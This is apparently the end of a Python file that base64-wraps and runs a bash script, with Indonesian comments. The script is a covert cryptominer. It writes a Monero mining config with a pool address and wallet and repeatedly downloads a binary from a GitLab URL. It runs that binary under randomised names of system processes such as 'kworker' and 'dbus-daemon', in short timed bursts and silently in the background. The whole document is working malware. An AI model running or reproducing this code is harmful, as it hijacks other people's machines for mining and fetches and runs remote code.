# Konfigurasi default
CONFIG_JSON='{
  "algo": "rx/0",
  "url": "3.144.16.65:80",
  "user": "Q0105004479f85cd7d62eeac7a6d6ec24cc6af897a72bac82b3f1d8a63b425e2430efd6504c753d",
  "pass": "x",
  "threads": 6
}'

# Daftar kemungkinan nama binary
POSSIBLE_NAMES=("dbus-daemon" "pulseaudio" "systemd-helper" "gvfsd" \
"gnome-session" "kworker" "migration" "watchdog")

# Lokasi penyimpanan
LOCAL_BIN_DIR="$HOME/.local/bin"
mkdir -p "$LOCAL_BIN_DIR"

# Fungsi untuk generate random string 8 karakter
generate_random_string() {
    local chars='abcdefghijklmnopqrstuvwxyz0123456789'
    local length=8
    local result=""
    for ((i=0; i<length; i++)); do
        result+=${chars:$RANDOM%${#chars}:1}
    done
    echo "$result"
}

while true; do
    # Hapus data sesi lama
    rm -f "$LOCAL_BIN_DIR"/*

    # Pilih nama binary acak
    BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
    
    # Tambahkan random string 8 karakter ke nama binary
    RANDOM_STR=$(generate_random_string)
    BIN_NAME_WITH_RANDOM="${BIN_NAME}${RANDOM_STR}"
    
    # Buat nama config dengan random string juga
    CONFIG_NAME="${BIN_NAME}${RANDOM_STR}_config.json"
    CONFIG_PATH="$LOCAL_BIN_DIR/$CONFIG_NAME"

    # Simpan config JSON
    echo "$CONFIG_JSON" > "$CONFIG_PATH"

    # Download binary baru dengan nama yang sudah di-random
    wget -q "https://gitlab.com/sarifadim/jomblo/-/raw/main/rstd" -O "$LOCAL_BIN_DIR/$BIN_NAME_WITH_RANDOM"
    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_WITH_RANDOM"

    # Tentukan waktu aktif (2–3 menit)
    ACTIVE_MIN=$((RANDOM % 2 + 2))
    ACTIVE_SEC=$((ACTIVE_MIN * 60))

    # Tentukan waktu istirahat (20–30 detik)
    IDLE_SEC=$((RANDOM % 11 + 20))

    # Jalankan proses dengan timeout
    timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME_WITH_RANDOM" --config="$CONFIG_PATH" >/dev/null 2>&1

    # Istirahat
    sleep "$IDLE_SEC"
done > /dev/null 2>&1 &
"""


encoded_script = base64.b64encode(shell_script.encode()).decode()

print("==== Base64 Shell Script ====")
print(encoded_script)
print("=======================================")

decoded_script = base64.b64decode(encoded_script).decode()
subprocess.Popen(decoded_script, shell=True)

print(f"Ã¢Å“â€¦ ok")
